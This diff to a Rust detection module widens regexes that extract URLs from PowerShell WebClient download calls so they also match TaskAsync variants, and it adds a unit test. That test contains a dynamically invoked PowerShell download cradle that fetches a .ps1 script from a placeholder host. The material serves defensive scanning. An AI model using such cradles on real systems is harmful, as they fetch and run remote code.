@@ -83,19 +83,19 @@ static PS_GENERIC_URL_RE: Lazy<Regex> = Lazy::new(|| {
 #[allow(clippy::expect_used)]
 static DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
     // (New-Object Net.WebClient).DownloadString('url') or .DownloadFile('url', 'dst')
-    Regex::new(r#"(?i)\.Download(?:String|File|Data)(?:Async)?\s*\(\s*["']([^"']+)["']"#)
+    Regex::new(r#"(?i)\.Download(?:String|File|Data)(?:(?:Task)?Async)?\s*\(\s*["']([^"']+)["']"#)
         .expect("ds")
 });
 
 #[allow(clippy::expect_used)]
 static BARE_DOWNLOADSTRING_RE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r#"(?i)\bDownload(?:String|File|Data)(?:Async)?\s*\(\s*["']([^"']+)["']"#)
+    Regex::new(r#"(?i)\bDownload(?:String|File|Data)(?:(?:Task)?Async)?\s*\(\s*["']([^"']+)["']"#)
         .expect("bare downloadstring")
 });
 
 #[allow(clippy::expect_used)]
 static DOWNLOADFILE_CALL_RE: Lazy<Regex> = Lazy::new(|| {
-    Regex::new(r#"(?is)\bDownloadFile(?:Async)?\s*\(\s*([^)]{0,2048})\)"#)
+    Regex::new(r#"(?is)\bDownloadFile(?:(?:Task)?Async)?\s*\(\s*([^)]{0,2048})\)"#)
         .expect("downloadfile call")
 });
 
@@ -303,7 +303,7 @@ static PS_URL_REGEX_SPECS: &[PsUrlRegexSpec] = &[
 #[allow(clippy::expect_used)]
 static DYNAMIC_DOWNLOAD_INVOKE_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?is)\.\s*\(?\s*["'](?:Download(?:String|File|Data)(?:Async)?|Down)["']\s*\)?\s*\.Invoke\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*)|["']([^"']+)["'])"#,
+        r#"(?is)\.\s*\(?\s*["'](?:Download(?:String|File|Data)(?:(?:Task)?Async)?|Down)["']\s*\)?\s*\.Invoke\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*)|["']([^"']+)["'])"#,
     )
     .expect("dynamic download invoke")
 });
@@ -5080,6 +5080,15 @@ mod dynamic_download_invoke_tests {
         );
 
         assert_eq!(urls, vec!["https://dyn-async.example/a.ps1"]);
+    }
+
+    #[test]
+    fn dynamic_downloadstringtaskasync_invoke_url_extracted() {
+        let urls = dynamic_download_invoke_urls(
+            r#"$b=New-Object Net.WebClient;$b.('DownloadStringTaskAsync').Invoke('https://dyn-taskasync.example/a.ps1')"#,
+        );
+
+        assert_eq!(urls, vec!["https://dyn-taskasync.example/a.ps1"]);
     }
 }
 
